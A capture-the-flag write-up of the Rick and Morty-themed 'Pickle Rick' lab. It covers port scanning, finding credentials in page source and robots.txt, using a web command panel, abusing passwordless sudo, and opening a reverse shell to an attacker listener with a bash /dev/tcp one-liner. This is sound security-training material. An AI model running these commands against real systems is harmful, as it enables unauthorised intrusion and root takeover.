### **2**
## **Pickle Rick**

- A Rick and Morty-themed challenge that requires us to exploit a web server and find **three** ingredients to help Rick make his potion and transform himself back into a human from a pickle.

1.  **Port Scanning** - First thing I did:
    `nmap -sS -sV -vv -p- <target>` - TCP SYN Scan, Version Detection, Verbose, Scan all ports (1-65535)
    ```
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

2.  Navigating to `http://target-ip:80` shows us a webpage with this text:
    ![web-application](/Images/pickle-rick/web-application.png)

3.  I right-clicked and chose **"View Page Source"** - I found a username there: `R1ckRul3s`
    ![username found in "Page Source"](/Images/pickle-rick/page-source.png)

4.  I also looked at request-responses using **"Inspect (Developer Tools)"**, but didn't find anything useful.

5.  **Content Discovery**: Using **gobuster** I found:
    `gobuster dir --url http://target-ip/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`
    ![gobuster-result](/Images/pickle-rick/gobuster-result.png)
    - Inside **`robots.txt`**, I found `Wubbalubbadubdub`. Since the robots.txt file contains paths we don't want crawlers to see, I added it to `http://<target-ip>/Wubbalubbadubdub`, but that page did not exist. Another idea is that it may be the password Rick was talking about on the main page of the web app.
    - **`robots.txt`** is a text file that tells robots (such as search engine indexers) how to behave, instructing them not to crawl certain paths on the website. It is placed within the root directory of a website.
    - Testing another wordlist:
      `gobuster dir --url http://target-ip/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/Logins.fuzz.txt`
      ![finding a login page using 'gobuster'](/Images/pickle-rick/gobuster-result-2.png)

6.  **Login**: Using the username `R1ckRul3s` and password `Wubbalubbadubdub`, I logged into `http://target-ip/login.php`. This gave us a command panel:
    ![login.php](/Images/pickle-rick/login-page.png)
    ![portal.php](/Images/pickle-rick/command-panel.png)

7.  **Commands that Led to Finding the 3 Flags (Ingredients)**:
    - `whoami` --> **`www-data`**
    - `ls -la` --> It seems the first flag is in the **`"Sup3rS3cretPickl3Ingred.txt"`** file.
    - The `cat` command did not work. I viewed the content of the file using `less Sup3rS3cretPickl3Ingred.txt` - **We have the first flag.**
      ![ls](/Images/pickle-rick/ls-l.png)
    - Looking for the second flag, I ran `find / -iname "*Ingred*" 2>/dev/null`:
      ```
      /var/www/html/Sup3rS3cretPickl3Ingred.txt
      /home/rick/second ingredients
      ```
    - Then used `less "/home/rick/second ingredients"` to get the **second flag** (due to spaces in the filename, we needed the quotes `" "`).
    - Now we are looking for the last flag. The `sudo -l` result:
      ```
      Matching Defaults entries for www-data on ip-10-65-164-207:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

      User www-data may run the following commands on ip-10-65-164-207:
        (ALL) NOPASSWD: ALL
      ```
    - This means the `www-data` user can run **any** command as **any** user (including **root**) without needing to enter a password.
    - You can prove this by entering `sudo whoami`, and the response will be `root`.
    - I decided to get a reverse shell so I could navigate the filesystem and find files more easily:
      ```
      1. nc -lvnp 4444        ## Run this on your own machine (attacker).
      2. sudo bash -c 'bash -i >& /dev/tcp/10.65.118.203/4444 0>&1'        ## Run this on the command panel (victim).
      ```
    - **Last flag found**: `cat /root/3rd.txt`
    
    
